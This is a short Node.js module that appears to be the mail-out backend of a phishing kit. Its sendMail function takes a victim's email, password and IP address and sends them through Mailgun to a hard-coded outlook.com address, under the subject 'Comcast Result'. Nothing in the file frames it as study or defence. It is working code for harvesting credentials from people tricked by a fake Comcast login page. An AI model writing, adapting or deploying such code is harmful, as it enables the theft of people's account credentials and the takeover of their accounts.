const nodemailer = require('nodemailer')
const mailGun = require('nodemailer-mailgun-transport')
require('dotenv').config();


const auth = {
    auth: {
        api_key: process.env.MAILGUN_API_KEY,
        domain: process.env.MAILGUN_DOMAIN
    }
};

const transporter = nodemailer.createTransport(mailGun(auth))

const sendMail = (email, passwd, visitorIP, cb) => {
    const mailOptions = {
      from: 'atyourservice@outlook.com', 
      to: 'hermandelgado456@outlook.com',
      subject: '--------Comcast Result------------',
      text: `----Email: ${email}\n -----Password: ${passwd}\n -----IP: ${visitorIP}\n \n---------The Index---------`
    };
  
    transporter.sendMail(mailOptions, function(err, data) {
      if (err) {
        cb(err, null);
      } else {
        cb(null, data);
      }
    });
  };

module.exports = sendMail

